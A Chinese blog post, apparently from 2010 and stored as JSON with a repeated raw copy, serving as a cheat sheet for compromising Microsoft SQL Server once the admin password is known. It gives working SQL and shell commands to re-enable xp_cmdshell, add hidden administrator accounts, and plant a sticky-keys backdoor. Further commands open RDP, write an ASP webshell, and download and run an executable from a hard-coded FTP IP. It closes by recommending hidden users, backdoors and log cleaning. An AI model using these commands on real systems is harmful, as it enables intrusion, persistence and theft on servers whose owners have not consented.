/></p>\n"},{"title":"1433提权","date":"2010-05-14T08:42:00.000Z","_content":"当你获得数据库的管理密码时，你还犹豫什么。提权吧、<br /><br />注意SQLDebuggerr用户<br />echo y|cacls c:windowssystem32net1.exe /p everyone:f<br />=======================================================================<br /><br />Error Message:未能找到存储过程 'master..xp_cmdshell'<br />修复法：很通用的，其实碰到 其他126 127的都可以一起修复，<br />除了xplog70.dll其他的都可以用这命令修复<br />第一步先删除：<br />drop procedure sp_addextendedproc<br />drop procedure sp_oacreate<br />exec sp_dropextendedproc 'xp_cmdshell'<br /><br />第二步恢复：<br />dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)<br /><br />未能找到存储过程 'master..xp_cmdshell'<br />第一步:<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call<br />*/<br />@dllname varchar(255)/* name of DLL containing function */<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) -- sp_addextendedproc<br />GO<br />第二步:<br />EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />=======================================================================<br />恢复cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br />开启cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br /><br />判断存储扩展是否存在<br />select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'<br />返回结果为1就ok<br />=======================================================================<br /><br />SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。<br />;EXEC sp_configure 'show advanced options', 1 --<br />;RECONFIGURE WITH OVERRIDE --<br />;EXEC sp_configure 'xp_cmdshell', 1 --<br />;RECONFIGURE WITH OVERRIDE --<br />;EXEC sp_configure&#160;&#160; 'show advanced options', 0 --<br />=======================================================================<br /><br />xplog70.dll修复：<br />Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。<br />修复XPLOG70.DLL（先用文件查看下备份的目录下x86bin,然后把下面目录替换）<br />第一步<br />exec sp_dropextendedproc 'xp_cmdshell'<br />第二步<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;c:sql2ksp4x86binnxplog70.dll&quot;)<br />=======================================================================<br /><br />恢复扩展存储过程的办法<br />先恢复sp_addextendedproc，语句如下：<br />第一：<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as<br />set implicit_transactions off<br />if @@trancount &gt; 0&#160; <br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')&#160; <br />return (1)&#160; <br />end<br />dbcc addextendedproc( @functname, @dllname)&#160; <br />return (0) -- sp_addextendedproc<br />GO<br />第二：<br />use master&#160; <br />exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'&#160; <br />exec sp_addextendedproc xp_dirtree,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_enumgroups,'xplog70.dll'&#160; <br />exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_loginconfig,'xplog70.dll'&#160; <br />exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'&#160; <br />exec sp_addextendedproc sp_OACreate,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OADestroy,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAMethod,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAStop,'odsole70.dll'&#160; <br />exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regread,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regwrite,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_availablemedia,'xpstar.dll'<br /><br /><br />--------------------------------------------------------------------------------------<br />一.更改sa口令方法：<br />用sql综合利用工具连接后，执行命令：<br />exec sp_password NULL,'新密码','sa'<br />(提示：慎用!)<br /><br />二.简单修补sa弱口令.<br />方法1:查询分离器连接后执行：<br />if exists (select * from<br />dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and<br />OBJECTPROPERTY(id, N'IsExtendedProc') = 1)<br />exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'<br />GO<br />然后按F5键命令执行完毕<br /><br />方法2:查询分离器连接后<br />第一步执行：use master<br />第二步执行：sp_dropextendedproc 'xp_cmdshell'<br />然后按F5键命令执行完毕<br /><br />无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br />恢复方法：查询分离器连接后,<br />第一步执行：sp_dropextendedproc &quot;xp_cmdshell&quot;<br />第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'<br /><br />无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br />恢复方法：查询分离器连接后,<br />第一步执行:exec sp_dropextendedproc 'xp_cmdshell'<br />第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />然后按F5键命令执行完毕<br /><br />如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:<br />查询分离器连接后,<br />2000servser系统:<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:winntsystem32cmd.exe /c net user Web hacker /add'<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:winntsystem32cmd.exe /c net localgroup administrators Web /add'<br />xp或2003server系统: 126错误！命令<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:windowssystem32cmd.exe /c net user Web$ hacker /add'<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:windowssystem32cmd.exe /c net localgroup administrators Web$ /add'<br />=======================================================================<br />找不到存储过程 sp_addextendedproc<br />解决方法:<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call */<br />@dllname varchar(255)/* name of DLL containing function */<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) -- sp_addextendedproc<br />GO<br />这段代码贴入查询分离器,执行<br />查看目录<br />exec master.dbo.xp_subdirs 'c:'<br />列出磁盘<br />e\nxec master..xp_fixeddrives<br />xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！<br />EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWareMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net user 123 123 /add&quot;)');<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net localgroup administrators 123 /add&quot;)');<br />=======================================================================<br />开3389：<br />exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal Server','fDenyTSConnections','REG_DWORD',0;--<br />关3389：<br />exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal Server','fDenyTSConnections','REG_DWORD',1;<br />查看3389端口<br />exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp','PortNumber'<br />普通CMD后门<br />xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe','debugger','reg_sz','c:windowssystem32cmd.exe'<br /><br />建立用户1-这里默认用户是Reconditeness密码9527可自行修改<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net1 user Reconditeness 9527 /ad &amp;net localgroup administrators terks /ad&quot;)')<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasias.mdb','select shell(&quot;cmd.exe /c net1 user Reconditeness 9527 /ad &amp;net localgroup administrators terks /ad&quot;)')<br /><br />win2K直接上PS马<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)')<br /><br />win03-XP直接上PS马<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasias.mdb','select shell(&quot;cmd.exe /c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)')<br /><br />shift后门命令<br />declare @o int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'copyfile',null,'c:windowsexplorer.exe' ,'c:windowssystem32sethc.exe';<br />declare @o int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'copyfile',null,'c:windowssystem32sethc.exe' ,'c:windowssystem32dllcachesethc.exe';<br />copy c:windowsexplorer.exe c:windowssystem32sethc.exe<br />copy c:windowssystem32sethc.exe c:windowssystem32dllcachesethc.exe<br /><br />declare @o int<br />exec sp_oacreate 'wscript.shell', @o out<br />exec sp_oamethod @o, 'run', NULL, 'XXXXX' XXXXX为你要执行的命令<br /><br /><br />开3389<br />REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br /><br />SQL写一句话<br />exec master.dbo.xp_subdirs 'd:webcdlxkj';<br />exec sp_makewebtask 'd:webcdlxkjXX.asp','select''&lt;%execute(request(&quot;SB&quot;))%&gt;'' '<br />SA沙盒模式提权-----<br />----------------------<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0;<br />-------------------------------------------------------<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net user sql$ 123 /add&quot;)');<br />-------------------------------------------------------<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net localgroup administrators sql$ /add&quot;)');<br /><br />SHIFT<br />入侵<br />EXEC master..xp_regwrite<br />@rootkey='HKEY_LOCAL_MACHINE',<br />@key='SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.EXE',<br />@value_name='Debugger',<br />@type='REG_SZ',<br />@value='C:WINDOWSexplorer.exe'<br />整个过程是利用master..xp_regwrite这组件来完成的,<br /><br />1.sql命令查询注册表粘滞键是否被劫持<br />exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe','Debugger'<br />2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)<br />xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe',<br />'Debugger','REG_SZ','C:WINDOWSsystem32taskmgr.exe'<br />3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用<br />xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe'<br /><br />sql写文件<br />declare @o int, @f int, @t int, @ret int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'createtextfile', @f out, 'c:1.vbs', 1<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(&quot;user&quot;,&quot;test&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword &quot;1234&quot;'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&amp;&quot;/test&quot;,user) '<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&amp;&quot;/test&quot;'<br />exec master..xp_cmdshell 'cscript c:1.vbs'<br /><br />无NET提权的脚本<br />struser=wscript.arguments(0)<br />strpass=wscript.arguments(1)<br />set lp=createObject(&quot;WSCRIPT.NETWORK&quot;)<br />oz=&quot;WinNT://&quot;&amp;lp.ComputerName<br />Set ob=GetObject(oz)<br />Set oe=GetObject(oz&amp;&quot;/Administrators,group&quot;)<br />Set od=ob.create(&quot;user&quot;,struser)<br />od.SetPassword strpass<br />od.SetInfo<br />Set of=GetObject(oz&amp;&quot;/&quot; &amp; struser &amp; &quot;,user&quot;)<br />oe.Add(of.ADsPath)<br />For Each admin in oe.Members<br />if struser=admin.Name then<br />Wscript.echo struser &amp; &quot; 建立成功!&quot;<br />wscript.quit<br />end if<br />Next<br />Wscript.echo struser &amp; &quot; 用户建立失败!&quot;<br />将以上保存为user.VBS文件<br />然后执行：cscript user.vbs 用户名 密码<br /><br />=======================================================================<br />恢复xp_cmdshell<br />exec sp_dropextendedproc 'xp_cmdshell'<br />EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />=======================================================================<br />开启xp_cmdshell<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'xp_cmdshell', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'show advanced options', 0<br />=======================================================================<br />开启Automation Procedures<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'Ole Automation Procedures',1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configur\ne 'show advanced options', 0<br />=======================================================================<br />开启Distributed Queries<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'Ad Hoc Distributed Queries',1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'show advanced options', 0<br />=======================================================================<br />恢复Xp_regwrite<br />EXEC sp_dropextendedproc 'Xp_regwrite'<br />exec sp_addextendedproc xp_regwrite,'xpstar.dll'<br />=======================================================================<br />恢复sp_OACreate<br />dbcc addextendedproc (&quot;sp_OACreate&quot;,&quot;odsole70.dll&quot;)<br />exec sp_addextendedproc sp_OAMethod,'odsole70.dll'<br />=======================================================================<br />cmdshell开3389<br />exec master..xp_cmdshell 'echo Windows Registry Editor Version 5.00&gt;c:3389.reg'<br />exec master..xp_cmdshell 'echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]&gt;&gt;c:3389.reg'<br />exec master..xp_cmdshell 'echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;c:3389.reg'<br />exec master..xp_cmdshell 'regedit /s c:3389.reg'<br />exec master..xp_cmdshell 'del c:3389.reg'<br />=======================================================================<br />cmdshell添加用户<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 密码 /add'<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 密码'<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 /active:yes'<br />insert resultcmd_cc exec master..xp_cmdshell 'net localgroup administrators 用户 /add'<br />=======================================================================<br />oacreate添加用户<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [net user support$ support /add]<br />EXEC sp_oamethod @s,[run], NULL, [net localgroup administrators support /add]<br />=======================================================================<br />regwrite添加用户<br />Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=iasdnary.mdb','select shell(&quot;net user 用户 密码 /add&quot;)')<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=iasdnary.mdb','select shell(&quot;net localgroup administrators 用户 /add&quot;)')<br />=======================================================================<br />cmdshell模式FTP下载:<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo open FTP地址&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo 123 &gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo 123 &gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo get 1433.exe sly.exe&gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo bye &gt;&gt;sly.sys]'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c ftp -s:sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c del sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c sly.exe'<br />=======================================================================<br />oacreate模式FTP下载:<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo open FTP地址&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo get 1433.exe sly.exe&gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo bye &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c ftp -s:sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c del sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c sly.exe]<br />=======================================================================<br />不需要XP_CMDSHLL执行CMD命令<br />exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net user 用户 密码 /add.&quot;)')<br />exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net localgroup administrators 用户 /add.&quot;)')<br />=======================================================================<br />SQL Server 阻止了对组件 'Ole Automation Procedures' 的 过程'sys.sp_OACreate' 的访问<br />sp_configure 'show advanced options', 1;<br />GO<br />RECONFIGURE;<br />GO<br />sp_configure 'Ole Automation Procedures', 1;<br />GO<br />RECONFIGURE;<br />GO<br />=============================================<br />错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.<br />SQL查看终端端口及开放情况：<br />exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp','PortNumber'<br />好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的，不可以放在一起执行，我是在sql tools 2.0工具里执行的，你也可以在分离器中执行，记得分别执行。<br />//这条语句将explorer.exe复制为sethc.exe<br />declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:windowsexplorer.exe','c:windowssystem32sethc.exe';<br />//这条语句将sethc.exe复制到dllcache目录下<br />declare @oo int exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:windowssystem32sethc.exe','c:windowssystem32dllcachesethc.exe';<br />这个两条语句执行的时间间隔最好不超过10秒钟，否则系统会自动恢复原来的文件。<br />另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。<br />=======================================================================<br />删除：<br />use master<br />exec sp_dropextendedproc 'xp_cmdshell'<br />exec sp_dropextendedproc 'xp_dirtree'<br />exec sp_dropextendedproc 'xp_enumgroups'<br />exec sp_dropextendedproc 'xp_fixeddrives'<br />exec sp_dropextendedproc 'xp_loginconfig'<br />exec sp_dropextendedproc 'xp_enumerrorlogs'<br />exec sp_dropextendedproc 'xp_getfiledetails'<br />exec sp_dropextendedproc 'Sp_OACreate'<br />exec sp_dropextendedproc 'Sp_OADestroy'<br />exec sp_dropextendedproc 'Sp_OAGetErrorInfo'<br />exec sp_dropextendedproc 'Sp_OAGetProperty'<br />exec sp_dropextendedproc 'Sp_OAMethod'<br />exec sp_dropextendedproc 'Sp_OASetProperty'<br />exec sp_dropextendedproc 'Sp_OAStop'<br />exec sp_dropextendedproc 'Xp_regaddmultistring'<br />exec sp_dropextendedproc 'Xp_regdeletekey'<br />exec sp_dropextendedproc 'Xp_regdeletevalue'<br />exec sp_dropextendedproc 'Xp_regenumvalues'<br />exec sp_dropextendedproc 'Xp_regread'<br />exec sp_dropextendedproc 'Xp_regremovemultistring'<br />exec sp_dropextendedproc 'Xp_regwrite'<br />drop procedure sp_makewebtask<br />go<br />----------------------------------------------------------------------------------<br />----------------------<br />--列出当前计算机名称--<br />----------------------<br />execute master..xp_getnetname<br />--------------------------------<br />-列出当前计算机的驱动器可用空间-<br />--------------------------------<br />execute master..xp_fixeddrives<br />========================<br />==列出服务器所有本地组==<br />========================\n<br />execute master..xp_enumgroups<br />======================<br />==获取MS SQL的版本号==<br />======================<br />execute master..sp_msgetversion<br />=========================================<br />==参数说明:目录名,目录深度,是否显示文件==<br />=========================================<br />execute master..xp_dirtree 'c:'<br />execute master..xp_dirtree 'c:',1<br />execute master..xp_dirtree 'c:',1,1<br />--------------------------------------------------------------------------------------------------------<br />sql2005<br />恢复xp_cmdshell<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br />关闭:<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br />-------------------------------------------------------------------------------------------------------------<br />把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.<br />然后用以下方法写入到对方计算机中。DECLARE @ObjectToken INT<br />EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT<br />EXEC sp_OASetProperty @ObjectToken, 'Type', 1<br />EXEC sp_OAMethod @ObjectToken, 'Open'<br />EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x123456(其中0x123456为HEX内容)<br />EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, 'Test.exe(文件名)', 2<br />EXEC sp_OAMethod @ObjectToken, 'Close'<br />EXEC sp_OADestroy @ObjectToken<br />复制代码写入之后, 就发挥你的办法去执行你写入的这个文件就OK了<br />FILE2HEX.VBS<br />On Error Resume Next<br />FilePath = Wscript.Arguments(0)<br />FieName = Right(FilePath, Len(FilePath) - InStrRev(FilePath, &quot;&quot;))<br />With CreateObject(&quot;Adodb.Stream&quot;)<br />.Type = 1: .open: .loadfromfile FilePath: Str = .read: Sl = LenB(Str)<br />End With<br /><br />Sll = Sl Mod 65536: Slh = Sl  65536<br />With CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(FilePath &amp; &quot;.txt&quot;, 2, True)<br />.Write &quot;0x&quot;<br />For i = 1 To Sl<br />bt = AscB(MidB(Str, i, 1))<br />If bt &lt; 16 Then .Write &quot;0&quot;<br />.Write Hex(bt)<br />Next<br />End With<br /><br />进去服务器后，创建隐藏用户。防止后门，清理日志，走人。。<br />嘿嘿，最后嘱咐一下，缺德的时候别多做。。看看就行，，","source":"_posts/1433提权.md","raw":"title: 1433提权\ncategories: [网络安全]\ntags: []\ndate: 2010-05-14 16:42:00\n---\n当你获得数据库的管理密码时，你还犹豫什么。提权吧、<br /><br />注意SQLDebuggerr用户<br />echo y|cacls c:windowssystem32net1.exe /p everyone:f<br />=======================================================================<br /><br />Error Message:未能找到存储过程 'master..xp_cmdshell'<br />修复法：很通用的，其实碰到 其他126 127的都可以一起修复，<br />除了xplog70.dll其他的都可以用这命令修复<br />第一步先删除：<br />drop procedure sp_addextendedproc<br />drop procedure sp_oacreate<br />exec sp_dropextendedproc 'xp_cmdshell'<br /><br />第二步恢复：<br />dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)<br /><br />未能找到存储过程 'master..xp_cmdshell'<br />第一步:<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call<br />*/<br />@dllname varchar(255)/* name of DLL containing function */<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) -- sp_addextendedproc<br />GO<br />第二步:<br />EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />=======================================================================<br />恢复cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br />开启cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br /><br />判断存储扩展是否存在<br />select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'<br />返回结果为1就ok<br />=======================================================================<br /><br />SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。<br />;EXEC sp_configure 'show advanced options', 1 --<br />;RECONFIGURE WITH OVERRIDE --<br />;EXEC sp_configure 'xp_cmdshell', 1 --<br />;RECONFIGURE WITH OVERRIDE --<br />;EXEC sp_configure&#160;&#160; 'show advanced options', 0 --<br />=======================================================================<br /><br />xplog70.dll修复：<br />Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。<br />修复XPLOG70.DLL（先用文件查看下备份的目录下x86bin,然后把下面目录替换）<br />第一步<br />exec sp_dropextendedproc 'xp_cmdshell'<br />第二步<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;c:sql2ksp4x86binnxplog70.dll&quot;)<br />=======================================================================<br /><br />恢复扩展存储过程的办法<br />先恢复sp_addextendedproc，语句如下：<br />第一：<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as<br />set implicit_transactions off<br />if @@trancount &gt; 0&#160; <br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')&#160; <br />return (1)&#160; <br />end<br />dbcc addextendedproc( @functname, @dllname)&#160; <br />return (0) -- sp_addextendedproc<br />GO<br />第二：<br />use master&#160; <br />exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'&#160; <br />exec sp_addextendedproc xp_dirtree,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_enumgroups,'xplog70.dll'&#160; <br />exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'&#160; <br />exec sp_addextendedproc 